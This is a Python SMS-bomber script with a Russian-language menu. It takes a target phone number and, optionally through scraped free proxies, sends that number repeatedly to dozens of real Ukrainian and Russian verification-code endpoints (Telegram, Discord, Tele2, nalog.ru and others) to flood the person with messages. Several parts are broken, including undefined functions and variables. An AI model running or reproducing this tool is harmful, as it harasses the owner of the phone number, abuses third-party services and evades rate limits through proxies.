# Version 1.0
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    console.print(proxy)
    return {"http": proxy, "https": proxy}
    main()

console.print('''[bold green]                                                                                          
  ___   _ __     __ _   _ __ ___  
 / __| | '_ \   / _` | | '_ ` _ \ 
 \__ \ | |_) | | (_| | | | | | | |
 |___/ | .__/   \__,_| |_| |_| |_|
       |_|                                                                         
''')


conut = console.input('\n[red][1] - Украина\n[2] - Россия\n\n[blue]spammer>> ')

console.print("[purple]Введите номер телефонa (без +): ")

number = console.input("[blue]spammer>> ")

proxy = console.input("[yellow]Использовать прокси? (y/n):\n[blue]spammer>> ")
if proxy.lower() == "y":
        proxies = generate_proxy()
else:
        proxies = None

run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))

def ukr():
        for _ in track(range(run)):
                user = fake_useragent.UserAgent().random
                headers = {'user_agent : user'}
                try:
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode", json={"recipient": "+" + number, "retailNetworkId": "4C25DB70-1DCE-11EB-A6EC-7B643829D650", "source": "WEB"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://ukrzoloto.ua/mobile/v1/auth/phone", json={"data": {"telephoneNumber": number}}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "9e337c61d8"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://sportbank.com.ua/send-sms", data={"phone": "+" + number, "agree": "1"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+38 (0##) ###-##-##")
                        requests.post("https://izibank.com.ua/api/send_link", json={"deviceIOS": "false", "phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass


def russ():
        for _ in track(range(run)):
                try:
                        requests.post("https://dodopizza.ru/api/sendconfirmationcode", data={"phoneNumber": phone}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, proxies=proxies)
                except:
                        pass
                try:
                        requests.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + number, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://skoro-pizza.ru/api/user/generate-password", data={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://www.2020700.ru/views/ajax/smscsend.php?phone={number}", proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://msk.tele2.ru/api/validation/number/{number}", json={"sender": "Tele2"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://brilliant24.ru/index/callme", data={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "8(###)###-##-##")
                        requests.post("https://hotkitchen-delivery.ru/user_account/ajax_1679123.php?do=sms_code", data={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+7 ### #######")
                        requests.post("https://api.vipavenue.ru/v2/user/authNew/", json={"phone": "+" + number, "step": "1", "type": "phone"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://www.italbazar.ru/api/v1/auth/send_otp/", json={"source":  "+" + number, "type": "phone", "phoneChanged": "false"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+7 (###) ###-##-##")
                        requests.post("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", data={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://blanc.ru/api/sso/entrance/login", json={"phoneNumber": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.get(f"https://privetmir.ru/recovery/step-2/?login={number}", proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+7+###+###-##-##")
                        requests.post("https://petrodv.takeeat.ru/ajax/callback_handler.php", data={"name": "Александр", "phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://1cmaster.tea.ru/local/ajax/mindbox.php", data={"type": "CheckCustomerByMobilePhone", "phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://www.traektoria.ru/local/ajax/authorize.php?action=2", data={"phone": number, "bxsessid": "e7e6c5b5e5695787dc9a77f39a70dd49", "lid": "tr"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "7+(###)+###+##+##")
                        requests.post("https://lk.ab-club.ru/login/send-code", data={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+7+(###)+###-##-##")
                        requests.post("https://www.zlato-grad.ru/catalog/sergi/puseti/yakutskie-brillianti/", data={"method": "get_code", "phone": "+" + number, "sessid": "6e10264ef2c09d2e78a1e871f1bf3288"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_pone = format_phone(number, "8+(###)+###+##+##")
                        requests.post("https://lk.ab-club.ru/register/send-code", data={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start", json={"phone": number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number,  "7(###)###-##-##")
                        requests.post("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", data={"email": email, "telephone": number, "password": "asasinkrid", "confirm": "asasinkrid"}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://mc.moezdorovie.ru/api/identity/Account/LoginApi?phoneNumber=+{number}", json={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + number}, proxies=proxies)
                        pass
                except:
                        pass


if conut =='1':
        ukr()
elif conut == '2':
        russ()